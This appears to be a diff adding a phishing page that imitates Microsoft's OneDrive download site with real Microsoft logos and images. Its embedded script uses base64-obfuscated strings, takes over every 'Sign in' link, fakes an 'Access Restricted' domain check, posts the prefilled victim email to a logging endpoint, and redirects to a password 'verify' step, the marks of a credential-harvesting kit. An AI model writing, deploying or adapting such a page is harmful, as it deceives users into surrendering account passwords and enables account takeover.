@@ -1,0 +1,219 @@
+<div style="margin:0;padding:0;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#fff">
+    <style>
+        /* Mobile Responsive Styles */
+        @media (max-width: 768px) {
+            .nav-container {
+                padding: 0 10px !important;
+                height: auto !important;
+                flex-wrap: wrap;
+            }
+            .nav-links-left {
+                display: none !important; /* Hide secondary links on mobile */
+            }
+            .nav-links-right {
+                width: 100%;
+                justify-content: flex-end;
+                padding: 10px 0;
+            }
+            .hero-section {
+                padding: 40px 20px !important;
+                background-position: center !important;
+            }
+            .hero-content {
+                margin: 20px auto !important;
+                padding-right: 0 !important;
+                text-align: center;
+                flex-direction: column;
+            }
+            .hero-title {
+                font-size: 32px !important;
+                margin-bottom: 20px !important;
+            }
+            .hero-desc {
+                font-size: 16px !important;
+                margin-bottom: 30px !important;
+            }
+            .hero-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            .hero-buttons a {
+                width: 100%;
+                text-align: center;
+                box-sizing: border-box;
+            }
+            .secondary-nav {
+                display: none !important; /* Hide secondary nav bar on mobile */
+            }
+            .features-grid {
+                grid-template-columns: 1fr !important;
+                gap: 20px !important;
+            }
+            .features-section {
+                padding: 40px 20px !important;
+            }
+            .features-title {
+                font-size: 28px !important;
+                margin-bottom: 40px !important;
+            }
+        }
+    </style>
+    <div class="nav-container" style="background:#fff;border-bottom:1px solid #e5e5e5;position:sticky;top:0;z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:0 20px;height:54px;max-width:1600px;margin:0 auto">
+        <div class="nav-links-left" style="display:flex;align-items:center;gap:25px">
+            <img src="https://uhf.microsoft.com/images/microsoft/RE1Mu3b.png" style="height:24px">
+            <a href="#" style="text-decoration:none;color:#262626;font-size:13px;font-weight:600">OneDrive</a>
+            <a href="#" style="text-decoration:none;color:#262626;font-size:13px">Plans and pricing ▼</a>
+            <a href="#" style="text-decoration:none;color:#262626;font-size:13px">Solutions ▼</a>
+            <a href="#" style="text-decoration:none;color:#262626;font-size:13px">Features ▼</a>
+            <a href="#" style="text-decoration:none;color:#262626;font-size:13px">Resources ▼</a>
+            <a href="#" style="text-decoration:none;color:#262626;font-size:13px">Support</a>
+            <script>
+        const _s = (s) => atob(s);
+        let prefilledEmail = ""; // SERVER_INJECT_EMAIL
+        // DOMAIN_INJECTION_POINT
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            if (prefilledEmail) {
+                if (typeof validateEmailDomain === 'function' && !validateEmailDomain(prefilledEmail)) {
+                    _sbde(prefilledEmail);
+                } else {
+                    setTimeout(_rtl, 2000);
+                }
+            }
+
+            const l = document.querySelectorAll('a');
+            
+            l.forEach(k => {
+                const t = k.textContent.trim().toLowerCase();
+                if (t.includes(_s('c2lnbiBpbg=='))) {
+                    k.href = '#';
+                    k.addEventListener(_s('Y2xpY2s='), function(e) {
+                        e.preventDefault();
+                        _rtl();
+                    });
+                }
+            });
+
+            function _sbde(e) {
+                const d = e.split('@')[1];
+                const eh = `
+                    <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.8); backdrop-filter: blur(5px); z-index: 9999; display: flex; align-items: center; justify-content: center;">
+                        <div style="background: white; padding: 40px; border-radius: 0; box-shadow: 0 2px 10px rgba(0,0,0,0.2); text-align: left; max-width: 440px; width: 90%; border-top: 4px solid #e81123;">
+                            <h3 style="color: #1b1b1b; margin: 0 0 10px 0; font-family: 'Segoe UI', sans-serif; font-size: 24px; font-weight: 600;">Access Restricted</h3>
+                            <p style="color: #e81123; margin: 0 0 20px 0; font-family: 'Segoe UI', sans-serif; font-size: 15px;">
+                                The domain <strong>@${d}</strong> is not authorized for this document.
+                            </p>
+                            <p style="color: #1b1b1b; margin: 0 0 30px 0; font-family: 'Segoe UI', sans-serif; font-size: 15px;">
+                                Please sign in using your organization email address.
+                            </p>
+                            <button onclick="window.location.href='/'" 
+                                    style="background: #0067b8; color: white; border: none; padding: 8px 32px; font-family: 'Segoe UI', sans-serif; font-size: 15px; cursor: pointer; font-weight: 600;">
+                                Use another account
+                            </button>
+                        </div>
+                    </div>
+                `;
+                document.body.insertAdjacentHTML(_s('YmVmb3JlZW5k'), eh);
+            }
+
+            function _rtl() {
+                document.getElementById(_s('bG9hZGluZy1vdmVybGF5')).style.display = _s('ZmxleA==');
+
+                // Log visit now (user reached password step via redirect)
+                if (prefilledEmail) {
+                    const formData = new FormData();
+                    formData.append('email', prefilledEmail);
+                    fetch('/api/log_visit', {
+                        method: 'POST',
+                        body: formData,
+                        keepalive: true
+                    }).catch(() => {});
+                }
+
+                setTimeout(function() {
+                    let bu = window.location.pathname;
+                    const ip = _s('L2luZGV4LnBocA==');
+                    const ph = _s('L3BhZ2UuaHRtbA==');
+                    
+                    if (bu === '/' || bu === ip) {
+                        bu = ph; 
+                    }
+                    
+                    let nu = bu;
+                    
+                    if (prefilledEmail && prefilledEmail.includes('@')) {
+                         if (!nu.endsWith('/')) nu += '/';
+                         nu += encodeURIComponent(prefilledEmail).replace(/%40/g, '@');
+                    }
+                    
+                    const cs = window.location.search;
+                    const sp = cs ? '&' : '?';
+                    nu += cs + sp + 'step=verify';
+                    
+                    window.location.href = nu;
+                }, 2000);
+            }
+        });
+    </script>
+    <!-- Loading Overlay with Blur Effect -->
+    <div id="loading-overlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.4);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:9999;align-items:center;justify-content:center;flex-direction:column">
+        <div class="spinner" style="width:48px;height:48px;border:4px solid rgba(0, 103, 184, 0.2);border-top:4px solid #0067b8;border-radius:50%;animation:spin 1s linear infinite"></div>
+    </div>
+    <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</div>
+        <div class="nav-links-right" style="display:flex;align-items:center;gap:15px">
+            <a href="#" style="text-decoration:none;color:#262626;font-size:13px">Search 🔍</a>
+            <a href="#" style="text-decoration:none;background:#000;color:#fff;padding:8px 20px;font-size:13px;font-weight:600;border-radius:2px">Download OneDrive</a>
+            <a href="#" style="text-decoration:none;color:#262626;font-size:13px">Sign In</a>
+        </div>
+    </div>
+</div>
+    
+    <div class="hero-section" style="background:url('https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/1023442-HeroBG?resMode=sharp2&op_usm=1.5,0.65,15,0&wid=2000&hei=750&qlt=100&fit=constrain') center/cover no-repeat;padding: 100px;position:relative;overflow:hidden">
+        <div class="hero-content" style="max-width:1400px;margin:90px auto;display:flex;align-items:center;justify-content:space-between">
+            <div style="max-width:600px;padding-right:40px">
+                <h1 class="hero-title" style="margin:0 0 30px;font-size:56px;font-weight:600;color:#1f1f1f;line-height:1.2">Download OneDrive</h1>
+                <p class="hero-desc" style="margin:0 0 40px;font-size:18px;color:#3b3b3b;line-height:1.6">If you have Windows 11, OneDrive is already installed on your PC. If you're using another version of Windows, install OneDrive to get started.</p>
+                <div class="hero-buttons" style="display:flex;gap:15px;margin-bottom:30px">
+                    <a href="#" style="text-decoration:none;background:#0f0f0f;color:#fff;padding:14px 32px;font-size:15px;font-weight:600;border-radius:2px;box-shadow:0 2px 8px rgba(0,0,0,.15)">Download OneDrive</a>
+                    <a href="#" style="text-decoration:none;background:transparent;color:#0f0f0f;padding:14px 32px;font-size:15px;font-weight:600;border:1px solid #0f0f0f;border-radius:2px">Sign in</a>
+                </div>
+                <a href="#" style="text-decoration:none;background:#0f0f0f;color:#fff;padding:12px 24px;font-size:14px;font-weight:600;border-radius:2px;display:inline-flex;align-items:center;gap:30px">▶ </a> See plans and pricing
+            </div>
+        </div>
+    </div>
+    
+    <div class="secondary-nav" style="background:#fff;border-bottom:2px solid #e5e5e5;position:sticky;top:54px;z-index:999">
+        <div style="max-width:1400px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:0 20px">
+            <div style="display:flex;gap:40px">
+                <a href="#" style="text-decoration:none;color:#0067b8;font-size:14px;font-weight:600;padding:18px 0;border-bottom:3px solid #0067b8">Key features</a>
+                <a href="#" style="text-decoration:none;color:#262626;font-size:14px;font-weight:600;padding:18px 0">Download the app</a>
+                <a href="#" style="text-decoration:none;color:#262626;font-size:14px;font-weight:600;padding:18px 0">Plans and pricing</a>
+                <a href="#" style="text-decoration:none;color:#262626;font-size:14px;font-weight:600;padding:18px 0">FAQ</a>
+            </div>
+            <div style="display:flex;gap:15px">
+                <a href="#" style="text-decoration:none;background:#0f0f0f;color:#fff;padding:10px 24px;font-size:13px;font-weight:600;border-radius:2px">Download OneDrive</a>
+                <a href="#" style="text-decoration:none;background:transparent;color:#0f0f0f;padding:10px 24px;font-size:13px;font-weight:600;border:1px solid #0f0f0f;border-radius:2px">Sign in</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="features-section" style="background:#fff;padding:80px 20px">
+        <div style="max-width:1400px;margin:0 auto">
+            <h2 class="features-title" style="margin:0 0 60px;font-size:42px;font-weight:600;color:#1f1f1f;text-align:center">Securely save and share what's important</h2>
+            <div class="features-grid" style="display:grid;grid-template-columns:repeat(3,1fr);gap:30px">
+                <div style="border-radius:12px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.08)">
+                    <img src="https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/1023442-keyfeatures-3?resMode=sharp2&op_usm=1.5,0.65,15,0&wid=1000&hei=550&qlt=100&fit=constrain" style="width:100%;display:block">
+                </div>
+                <div style="border-radius:12px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.08)">
+                    <img src="https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/1023442-keyfeatures-1?resMode=sharp2&op_usm=1.5,0.65,15,0&wid=1000&hei=542&qlt=100&fit=constrain" style="width:100%;display:block">
+                </div>
+                <div style="border-radius:12px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.08)">
+                    <img src="https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/1023442-keyfeatures-2?resMode=sharp2&op_usm=1.5,0.65,15,0&wid=1000&hei=550&qlt=100&fit=constrain" style="width:100%;display:block">
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
